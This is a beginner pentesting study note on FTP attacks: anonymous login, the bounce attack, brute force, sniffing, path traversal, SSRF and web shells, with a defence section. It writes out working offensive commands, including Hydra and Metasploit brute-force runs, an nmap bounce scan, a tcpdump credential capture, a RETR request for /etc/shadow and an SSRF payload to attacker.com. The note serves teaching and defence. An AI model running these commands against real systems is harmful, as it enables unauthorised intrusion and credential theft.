---
tags: [ftp, network, anonymous, bounce, brute-force]
difficulty: beginner
module: "35 - Network Protocol Attacks"
topic: "35.01 FTP"
---

# FTP — Anonymous Login, Bounce Attack, Credential Brute Force

## 1. Overview of File Transfer Protocol (FTP)
File Transfer Protocol (FTP) is a standard network protocol provided by RFC 114 (and updated in many subsequent RFCs, prominently RFC 959). It is used for the transfer of computer files between a client and server on a computer network. Built on a client-server model architecture using separate control and data connections between the client and the server.

By default, FTP operates on two specific ports:
- **Port 21 (Command/Control Port):** Used for establishing the connection, authenticating, sending commands, and receiving server responses.
- **Port 20 (Data Port):** Used for actual file data transfer in Active mode, whereas Passive mode uses a dynamically allocated high-numbered port.

Because FTP was designed in the early days of the Internet, it completely lacks modern security mechanisms natively. All communications, including authentication credentials (usernames and passwords), are transmitted in plain, unencrypted cleartext. This fundamental design flaw makes it a primary target for network sniffers and man-in-the-middle attacks.

### 1.1 Active vs. Passive Mode Connections
Understanding the connection modes is crucial for comprehending certain attacks like the FTP Bounce attack and for configuring firewalls correctly.

**Active Mode:**
In Active mode, the client opens a dynamic, unprivileged port (N > 1023) and sends it to the server via the `PORT` command. The server then connects back to the client's specified dynamic port from its own Port 20 to initiate the data transfer. 
This often causes severe firewall issues because the server is the one initiating the incoming connection to the client. Most modern client-side firewalls will block this unprompted incoming connection.

**Passive Mode:**
To resolve the firewall issues of Active mode, Passive mode was introduced. The client sends the `PASV` command to the server. The server responds with its IP address and a dynamically allocated port number. The client then initiates the data connection to the server's dynamic port. This is much more firewall-friendly for the client, as the client initiates both connections.

## 2. ASCII Diagram: FTP Bounce Attack Architecture

```text
    [Attacker (Client)] 
       |       |
       |       | (1) Control Channel (TCP Port 21)
       |       |     Sends: PORT 192,168,1,50,0,80 (Victim IP & Port)
       |       V
    [Vulnerable FTP Server]
           |
           | (2) Data Channel Initiation (TCP Port 20)
           |     Connects to 192.168.1.50:80 (Victim internal HTTP)
           V
    [Internal Victim / Target Service]
       (e.g., Port 80, 22, 445)
       
       (3) Attacker sends payload via FTP Data Channel 
           which is blindly routed to the Target Service by the FTP Server
```

## 3. Vulnerability Deep Dive

### 3.1 Anonymous Login
FTP servers can be deliberately configured to allow anonymous access. This was traditionally intended for public software distribution, open document repositories, or driver downloads from hardware manufacturers.

**The Mechanics:**
When anonymous access is enabled, users can authenticate using the username `anonymous` or `ftp`. Traditionally, the password is expected to be the user's email address, but in almost all implementations, any string is accepted as a valid password.

**The Risk:**
If improperly configured, the anonymous user might have write permissions (`STOR` command) or read access to sensitive directories beyond the intended public folder. This can lead to:
- **Sensitive data disclosure:** Exposing configuration files, source code, backup archives, or user data.
- **Malware hosting:** Attackers upload malicious payloads (Trojans, ransomware) to the public FTP server for distribution, using the server's bandwidth and reputation.
- **Disk exhaustion (Denial of Service):** Attackers flood the server by uploading massive files, consuming all available disk space and crashing services.

**Exploitation Example:**
```bash
$ ftp 192.168.1.100
Connected to 192.168.1.100.
220 (vsFTPd 3.0.3)
Name (192.168.1.100:root): anonymous
331 Please specify the password.
Password: anonymous@domain.com
230 Login successful.
ftp> ls -la
227 Entering Passive Mode (192,168,1,100,14,178).
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jan 01 12:00 public
-rw-r--r--    1 0        0            1024 Jan 01 12:05 backup_config.bak
226 Directory send OK.
ftp> get backup_config.bak
```

### 3.2 FTP Bounce Attack
The FTP Bounce attack is an older but classic attack that exploits the original design of FTP's Active mode and the `PORT` command.

**The Mechanics:**
In standard Active mode, the client tells the server which IP and port to connect back to for the data transfer using the `PORT` command. The format is `PORT h1,h2,h3,h4,p1,p2`, where `h` is the IP address and `p` calculates the port (`p1 * 256 + p2`).
Critically, the original RFC did not mandate that the IP address specified in the `PORT` command must match the client's actual IP address.

**The Attack:**
An attacker sends a `PORT` command instructing the FTP server to connect to a *third-party* target machine on a specific port (e.g., an internal web server). The attacker then uploads a payload to the FTP server, which the FTP server then transmits to the victim machine.
This effectively turns the vulnerable FTP server into an unwitting proxy, allowing the attacker to:
- Bypass perimeter firewalls (if the FTP server is situated in a DMZ and has routing access to internal network segments).
- Obfuscate the true source IP of the attack.
- Perform stealthy port scanning on internal networks that the attacker cannot reach directly.

**Exploitation via Nmap:**
The Nmap security scanner can utilize vulnerable FTP servers for bounce scanning to map internal networks:
```bash
nmap -Pn -v -n -p80,443,445,3389 -b <ftp_user>:<ftp_pass>@<ftp_server_ip> <target_internal_subnet>
```

### 3.3 Credential Brute Force & Dictionary Attacks
Because FTP heavily relies on simple username/password authentication, and many default configurations lack inherent rate-limiting or account lockout mechanisms, it is highly susceptible to brute-force and dictionary attacks.

**The Mechanics:**
An attacker systematically attempts multiple username and password combinations until a valid match is found. This is typically automated using robust network login crackers like Hydra, Medusa, or Ncrack, combined with large wordlists (like `rockyou.txt`).

**The Risk:**
Successful brute-forcing grants the attacker the privileges of the compromised account. If an administrator is using FTP and their account is compromised, the attacker gains widespread access to the file system.

**Exploitation using Hydra:**
```bash
hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.50 -V
```

**Exploitation using Metasploit Framework:**
```bash
msfconsole
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 10.10.10.50
msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE /usr/share/wordlists/usernames.txt
msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ftp/ftp_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/ftp/ftp_login) > run
```

## 4. Cleartext Protocol Weakness (Packet Sniffing)
As a fundamentally cleartext protocol, all FTP commands and server responses, crucially including the `USER` and `PASS` commands, are transmitted over the network completely unencrypted.

**The Mechanics:**
An attacker situated on the same local network segment (using ARP spoofing), or anywhere along the routing path, can easily capture network traffic using packet analysis tools like Wireshark or tcpdump.

**Exploitation & Capture:**
```bash
tcpdump -i eth0 port 21 -A -w ftp_traffic.pcap
```
By analyzing the resulting `.pcap` file, or simply reading the ASCII output (`-A`), the attacker can instantly view usernames and passwords in plaintext as they traverse the wire.

## 5. Security Misconfigurations and Extensibility Vulnerabilities
Beyond the standard protocol vulnerabilities, FTP servers frequently suffer from administrative misconfigurations and exploitable software extensions.

### 5.1 Directory Traversal (Path Traversal)
If the FTP server software fails to properly sanitize user input, an attacker might use directory traversal sequences (e.g., `../../`) within commands to navigate outside the intended FTP root directory. This allows access to sensitive system files.
Example malicious command: `RETR ../../../../../etc/shadow`

### 5.2 Vulnerable Server Versions
Historically, many popular FTP server implementations have suffered from severe, easily exploitable vulnerabilities:
- **vsftpd 2.3.4 Backdoor:** A famous supply-chain attack where a malicious backdoor was introduced into the official source code. The backdoor is triggered by adding a smiley face `:)` to the username during login. This silently spawns a root shell on port 6200.
- **ProFTPD Mod_Copy Command Execution:** The `mod_copy` module allowed unauthenticated users to copy files around the server using the `SITE CPFR` and `SITE CPTO` commands. This leads to Remote Code Execution (RCE) if a malicious PHP file can be copied into an accessible web document root.

## 6. Defensive Strategies & Mitigation

### 6.1 Securing Authentication Processes
- **Disable Anonymous Access:** Unless absolutely necessary for a strictly public repository, anonymous login must be disabled in the server configuration (e.g., `anonymous_enable=NO` in vsftpd).
- **Strong Password Policies:** Enforce complex passwords and regular rotation to mitigate the effectiveness of dictionary and brute-force attacks.
- **Implement Rate Limiting/Account Lockout:** Utilize tools like Fail2Ban or robust firewall rules to monitor authentication logs and automatically ban IP addresses that generate excessive failed authentication attempts.

### 6.2 Replacing FTP with Secure Alternatives
The single most effective mitigation strategy is to deprecate and abandon cleartext FTP entirely in favor of modern, encrypted alternatives:
- **SFTP (SSH File Transfer Protocol):** Operates entirely over an encrypted SSH tunnel (TCP Port 22), providing robust cryptographic security and strong authentication mechanisms natively.
- **FTPS (FTP over SSL/TLS):** Adds a layer of robust TLS encryption over the standard FTP protocol (implicit FTPS on Port 990, or explicit FTPS via the `AUTH TLS` command on Port 21).

### 6.3 Network and Firewall Defenses
- **Restrict Access (IP Allowlisting):** Use network firewalls to strictly limit FTP access only to known, trusted, and required IP addresses.
- **Prevent Bounce Attacks:** Ensure the FTP server is explicitly configured to reject `PORT` commands directed to IP addresses other than the originating client's IP. Most modern servers do this by default, but legacy systems must be checked.
- **Network Segmentation:** Place FTP servers in an isolated DMZ (Demilitarized Zone) to prevent lateral movement into the core network if the server itself is compromised.

### 6.4 Server Configuration Best Practices
- **Chroot Jail Environments:** Confine authenticated FTP users strictly to their specific home directories using chroot functionality. This prevents them from traversing the directory tree to the root filesystem.
- **Disable Unnecessary Commands:** Disable potentially dangerous commands like `SITE EXEC` or module commands if they are not explicitly required for business operations.
- **Regular Patching:** Implement a strict patch management lifecycle to keep the FTP server software updated to patch known CVEs immediately.

## 7. Advanced Exploitation Scenarios

### 7.1 Cross-Protocol Attacks via FTP
In some complex scenarios, an attacker can use a web application vulnerability, such as Server-Side Request Forgery (SSRF), to interact with an internal, isolated FTP server. Because FTP utilizes a newline-separated command structure, an attacker can craft a malicious URL payload (`ftp://attacker.com/payload%0d%0aCOMMAND...`) to force the vulnerable web server to send arbitrary commands to the FTP server.

### 7.2 Post-Exploitation Persistence and Web Shells
Once an attacker gains write access to an FTP directory that unfortunately overlaps with a web server's document root (a common misconfiguration), they can upload a web shell (e.g., `cmd.php` or `shell.aspx`). This simple file upload transitions an FTP compromise into full Remote Code Execution (RCE) on the underlying web server via the browser.

## 8. Chaining Opportunities
- **FTP Upload to Web Shell RCE:** If the FTP root directory overlaps with a Web Server's document root, an attacker can upload a web shell via FTP and execute it via the browser. -> [[05 - File Upload Vulnerabilities]]
- **Anonymous FTP to Info Disclosure:** Discovering a configuration file, SSH key, or source code backup via an anonymous FTP share can provide critical credentials or architectural knowledge required for attacking other network services. -> [[01 - Information Gathering]]
- **FTP Bounce to Internal Network Scanning:** Leveraging a vulnerable DMZ FTP server to bypass the perimeter firewall and conduct stealthy port scanning against the internal network. -> [[02 - Network Mapping]]

## 9. Related Notes
- [[02 - SSH — Brute Force, Weak Keys, Version Vulns]]
- [[03 - Telnet — Cleartext Protocol Attacks]]
- [[01 - Nmap Port Scanning Techniques]]
- [[12 - Password Cracking Strategies]]
- [[04 - Web Application SSRF]]

---
*End of Note*
